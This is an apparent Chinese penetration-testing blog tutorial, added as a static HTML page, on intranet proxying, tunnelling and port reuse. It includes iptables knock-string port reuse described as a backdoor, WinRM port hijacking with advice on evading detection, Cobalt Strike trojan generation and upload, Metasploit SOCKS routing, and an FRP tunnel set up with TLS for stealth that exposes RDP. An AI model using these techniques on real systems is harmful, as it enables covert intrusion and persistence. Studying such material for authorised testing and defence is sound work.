@@ -1,0 +1,1091 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="yuBetter">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://example.com/2024/02/29/内网代理与转发/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="内网代理与转发内网代理转发概述在渗透测试中，为了去发现内网资产的脆弱性，暴露更大的攻击面，往往是需要搭建代理通道，在外网实现对内网系统的访问 进入内网之后，为了突破内网网络边界隔离，一般需要搭建多层代理，实现从DMZ等入口边界网络向生产网、核心网、办公网等靶标所在网络的跨越 在多层网络隔离的情况下，为了实现对更深层次网络的访问，往往需要在最深处搭建代理，结合端口转发实现网络跨越 网络环境中只允许指">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网代理与转发">
+<meta property="og:url" content="https://example.com/2024/02/29/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E4%B8%8E%E8%BD%AC%E5%8F%91/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="内网代理与转发内网代理转发概述在渗透测试中，为了去发现内网资产的脆弱性，暴露更大的攻击面，往往是需要搭建代理通道，在外网实现对内网系统的访问 进入内网之后，为了突破内网网络边界隔离，一般需要搭建多层代理，实现从DMZ等入口边界网络向生产网、核心网、办公网等靶标所在网络的跨越 在多层网络隔离的情况下，为了实现对更深层次网络的访问，往往需要在最深处搭建代理，结合端口转发实现网络跨越 网络环境中只允许指">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202120080.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202137316.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202158661.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202219814.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202306092.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807111526311.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213358335.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213429129.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213528410.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213724414.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808214021093.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213942189.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808214411864.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808215127079.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808214339161.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808214520912.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807140351823.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202630911.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202712920.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202941052.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808203028506.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808203051929.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808203317835.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808203346583.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808210803597.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808211634009.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808211640410.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808211732930.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808212150494.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808212221892.png">
+<meta property="article:published_time" content="2024-02-29T13:18:47.000Z">
+<meta property="article:modified_time" content="2024-02-29T13:19:25.414Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202120080.png">
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/yubetter.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/yubetter.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/yubetter.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            内网代理与转发 -
+        
+        Yu&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/assets/fonts.css">
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[""]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true},"home_banner":{"enable":true,"image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"好好学习，天天向上","subtitle":{"text":["有远大志向而脚踏实地，有障碍失败而不言放弃","静以修生，俭以养德，非淡泊无以明志，非宁静无以致远","即使慢，驰而不息，纵会落后，纵会失败，但一定可以达到他所向的目标","穷且益坚，不坠青云之志","莫不有始，鲜克有终","靡不有初,鲜克有终"],"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/yuBetter","instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.1.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":false,"position":"left","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Yu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+             
+                <div class="article-title">         
+                    <img src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/todaybing-hd-f2CAu3mV-20210512.jpg" alt="内网代理与转发" />
+                    <h1 class="article-title-cover">内网代理与转发</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/yubetter-logon.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">yuBetter</span>
+                            
+                                <span class="author-label"></span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-02-29 21:18:47</span>
+        <span class="mobile">2024-02-29 21:18</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-02-29 21:19:25</span>
+            <span class="mobile">2024-02-29 21:19</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>3.4k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>13 Mins</span>
+        </span>
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h1 id="内网代理与转发"><a href="#内网代理与转发" class="headerlink" title="内网代理与转发"></a>内网代理与转发</h1><h2 id="内网代理转发概述"><a href="#内网代理转发概述" class="headerlink" title="内网代理转发概述"></a>内网代理转发概述</h2><p>在渗透测试中，为了去发现内网资产的脆弱性，暴露更大的攻击面，往往是需要搭建代理通道，在外网实现对内网系统的访问</p>
+<p>进入内网之后，为了突破内网网络边界隔离，一般需要搭建多层代理，实现从DMZ等入口边界网络向生产网、核心网、办公网等靶标所在网络的跨越</p>
+<p>在多层网络隔离的情况下，为了实现对更深层次网络的访问，往往需要在最深处搭建代理，结合端口转发实现网络跨越</p>
+<p>网络环境中只允许指定端口出网的时候，为了实现边界突破，需要进行端口复用，实现对防火墙的跨越</p>
+<h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p>客户端——–&gt;代理节点——–&gt;服务器</p>
+<p>正向代理，主要的原理是客户端为了从服务器中取得内容，向代理服务器发送一个请求并指定目标服务器，然后代理服务器转交请求，并将内容返回客户端</p>
+<h4 id="正向隧道"><a href="#正向隧道" class="headerlink" title="正向隧道"></a>正向隧道</h4><p>攻击机—-（监听端口）—-&gt;被控主机（开启的端口）——–&gt;访问被控网络</p>
+<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>攻击机&lt;—-代理服务器&lt;—-服务器</p>
+<p>服务器根据客户端的请求，获取资源后通过代理服务器将资源返回给客户端，客户端只会知道代理服务器的IP地址</p>
+<h4 id="反向隧道"><a href="#反向隧道" class="headerlink" title="反向隧道"></a>反向隧道</h4><p>被控网络&lt;—&gt;被控主机—&gt;自己vps服务器—&gt;攻击机</p>
+<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>客户端—-&gt;端口A&lt;—-&gt;端口B</p>
+<p>通过一一系列的配置或者软件，将访问端口A的流量转发到端口B上</p>
+<p>端口A\B可以是本地端口也可以是远程端口</p>
+<p>端口A\B可以是同一主机也可以是在不同主机</p>
+<h3 id="端口复用"><a href="#端口复用" class="headerlink" title="端口复用"></a>端口复用</h3><p>用户A—-&gt;端口B—-防火墙—-&gt;端口A—-&gt;程序C—-&gt;程序A和程序B</p>
+<p>不同的应用程序使用相同端口进行通讯</p>
+<p>端口复用在系统已经开放的端口上进行通讯，只对输入的信息进行字符匹配，不对网络数据进行任何拦截、复制类操作，所以对网络数据的传输性能丝毫不受影响，但会会影响业务，实战应用很少</p>
+<p>端口复用可以更好的隐藏攻击行为，有时也用作通道后门</p>
+<h4 id="Linux端口复用"><a href="#Linux端口复用" class="headerlink" title="Linux端口复用"></a>Linux端口复用</h4><p>使用iptables进行端口复用</p>
+<p>新建端口复用链</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -N PUBLIC_ALLOW</span><br></pre></td></tr></table></figure></div>
+
+<p>端口复用规则</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -As PUBLIC_ALLOW -p tcp -j REDIRECT --to-port【目标端口】</span><br></pre></td></tr></table></figure></div>
+
+<p>开启端口复用开关</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp -m string --string &#x27;kaikaikai&#x27; --algo bm -m recent --name public_allow --remove -j ACCEPT</span><br></pre></td></tr></table></figure></div>
+
+<p>设置时效性</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name public_allow --rsource -j PUBLIC_ALLOW</span><br></pre></td></tr></table></figure></div>
+
+<p>使用socat发送约定口令至目标主机打开端口复用开关</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo kaikaikai | socat - tcp:【目标服务器】:80</span><br></pre></td></tr></table></figure></div>
+
+<p>使用完毕之后，发送约定关闭口令至目标主机目标端口关闭端口复用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo kaikaikai | socat - tcp:【目标服务器】:80</span><br></pre></td></tr></table></figure></div>
+
+<p>注意：使用该方法开启的端口复用是有限复用，正常的业务会受影响，仅用于后门留存，或者临时使用，不建议长期使用</p>
+<h4 id="Windows端口复用"><a href="#Windows端口复用" class="headerlink" title="Windows端口复用"></a>Windows端口复用</h4><h5 id="HTTPS-sys端口复用"><a href="#HTTPS-sys端口复用" class="headerlink" title="HTTPS.sys端口复用"></a>HTTPS.sys端口复用</h5><p>在IIS6.0之后微软HTTPS.sys原生提供端口复用的功能</p>
+<p>只要注册不用的前缀即可使用</p>
+<p>WinRM（微软远程管理服务）就是在HTTPS.sys上注册了wsman的URL前缀，默认监听端口5985</p>
+<p>查询当前注册URL前缀</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh  http show servicestate</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202120080.png"
+                      alt="image-20230808202120080"
+                ></p>
+<p>开启WinRM服务</p>
+<p>在开启Windows2012以上的服务操作系统种，WinRM服务默认启动并且监听了5985端口</p>
+<p>对于Windows2008，则需要使用以下命令来启动WinRM服务</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig -q</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202137316.png"
+                      alt="image-20230808202137316"
+                ></p>
+<p>增加80端口复用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202158661.png"
+                      alt="image-20230808202158661"
+                ></p>
+<p>此时80和5985均处在开启状态</p>
+<p>更改WinRM端口</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202219814.png"
+                      alt="image-20230808202219814"
+                ></p>
+<p>在5985默认不开启的情况下执行此命令，否则容易被发现</p>
+<p>如果默认开启5985，仅做上一步即可</p>
+<p>查看是否已经增加80端口的WRM前缀</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh  http show servicestate</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202306092.png"
+                      alt="image-20230808202306092"
+                ></p>
+<h3 id="代理客户端工具"><a href="#代理客户端工具" class="headerlink" title="代理客户端工具"></a>代理客户端工具</h3><p>Proxifier</p>
+<h3 id="浏览器代理工具"><a href="#浏览器代理工具" class="headerlink" title="浏览器代理工具"></a>浏览器代理工具</h3><p>Proxy SwitchOmega</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807111526311.png"
+                      alt="image-20230807111526311"
+                ></p>
+<h2 id="代理协议以及工具"><a href="#代理协议以及工具" class="headerlink" title="代理协议以及工具"></a>代理协议以及工具</h2><h3 id="常见的代理技术"><a href="#常见的代理技术" class="headerlink" title="常见的代理技术"></a>常见的代理技术</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TCP：Socks4（a）---工具CS、pystinger    Socks5---SSH、FRP、NPS、iox</span><br><span class="line">UDP：KCP---Dtunnel、UDPtunnel     DNS---DNS2TCP、DNSCAT</span><br><span class="line">ICMP：工具pingtunnel、icmpsh</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Socks4a"><a href="#Socks4a" class="headerlink" title="Socks4a"></a>Socks4a</h3><h4 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h4><p>内网渗透利器，团队协作平台</p>
+<p>可以进行水坑、鱼叉攻击</p>
+<p>具有高度可扩展的框架</p>
+<p>通过一些手段获取到这台主机权限之后，发现内网环境中还有一台主机只能由这个已上线的主机访问</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213358335.png"
+                      alt="image-20230808213358335"
+                ></p>
+<p>在已上线的主机上设置socks代理端口为9071</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213429129.png"
+                      alt="image-20230808213429129"
+                ></p>
+<p>主机添加代理服务，address是主机的IP地址</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213528410.png"
+                      alt="image-20230808213528410"
+                ></p>
+<p>然后设置规则，目标主机机需要上线的主机，选择刚才添加好的Action</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213724414.png"
+                      alt="image-20230808213724414"
+                ></p>
+<p>在开启一个监听，为正向监听，端口设置为2222</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808214021093.png"
+                      alt="image-20230808214021093"
+                ></p>
+<p>生成正向木马Windows executable(s)，选择新建立的监听</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808213942189.png"
+                      alt="image-20230808213942189"
+                ></p>
+<p>上传生成的木马到靶机</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808214411864.png"
+                      alt="image-20230808214411864"
+                ></p>
+<p>此时运行是不会上线的</p>
+<p>但是在刚才开启端口的窗口运行connect 目标主机IP  2222（监听端口）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808215127079.png"
+                      alt="image-20230808215127079"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808214339161.png"
+                      alt="image-20230808214339161"
+                ></p>
+<p>即可上线目标主机</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808214520912.png"
+                      alt="image-20230808214520912"
+                ></p>
+<h4 id="通信逻辑"><a href="#通信逻辑" class="headerlink" title="通信逻辑"></a>通信逻辑</h4><p>攻击机—socks4a—&gt;CS（cs负责开启socks代理服务1234端口）&lt;—上线（http&#x2F;https）—&gt;内网主机</p>
+<p>条件：sleep调整为0</p>
+<h3 id="MSF（不常用）"><a href="#MSF（不常用）" class="headerlink" title="MSF（不常用）"></a>MSF（不常用）</h3><h4 id="设置路由"><a href="#设置路由" class="headerlink" title="设置路由"></a>设置路由</h4><p>msf会话：route[add&#x2F;remove]subnet netmask [comm&#x2F;sid]</p>
+<p>Meterpreter会话：run autoroute [-r] -s subnet -n netmask</p>
+<h4 id="开启代理服务"><a href="#开启代理服务" class="headerlink" title="开启代理服务"></a>开启代理服务</h4><p>use auxiliary&#x2F;server&#x2F;socks4a</p>
+<p>use auxiliary&#x2F;server&#x2F;socks5</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230807140351823.png"
+                      alt="image-20230807140351823"
+                ></p>
+<h3 id="FRP反向代理"><a href="#FRP反向代理" class="headerlink" title="FRP反向代理"></a>FRP反向代理</h3><p>在frp客户端配置的时候需要开启tls这样比较隐蔽</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#开启tls</span><br><span class="line">tls_enable=True</span><br></pre></td></tr></table></figure></div>
+
+<p>环境提要：服务端kali：192.168.81.135      客户端win7：192.168.81.161</p>
+<p>服务端配置frps.ini</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202630911.png"
+                      alt="image-20230808202630911"
+                ></p>
+<p>客户端配置frpc.ini，remote_port&#x3D;9000表示远程的连接端口是9000</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202712920.png"
+                      alt="image-20230808202712920"
+                ></p>
+<p>服务端开启监听</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808202941052.png"
+                      alt="image-20230808202941052"
+                ></p>
+<p>客户端运行frpc.ini</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808203028506.png"
+                      alt="image-20230808203028506"
+                ></p>
+<p>服务端收到响应</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808203051929.png"
+                      alt="image-20230808203051929"
+                ></p>
+<p>此时就将客户端的192.168.81.161:3389端口转发到服务端的192.168.81.135:9000端口了</p>
+<p>所以可以直接利用服务端IP+端口连接RDP</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808203317835.png"
+                      alt="image-20230808203317835"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230808203346583.png"
+                      alt="image-20230808203346583"
+                ></p>
+<h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><p>nps.conf存在未授权，需要将auth_key和auto_crypt注释去掉并且在后面加几个自己的字符，避免被别人连接</p>
+<p>挂nps代理扫端口，不准确是显示任何端口都开放，用不了，而frp不会，会显示真实的端口开放情况</p>
+<p>frp和nps有什么区别：本质上是没有区别的，就是使用习惯上的问题，nps偏向于web页面的管理，frp就是配置文件，偏向命令行</p>
+<h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><p>ICMP是TCP&#x2F;IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息</p>
+<p>控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身消息</p>
+<p>协议带有Message Body，利用该部分实现信息传递</p>
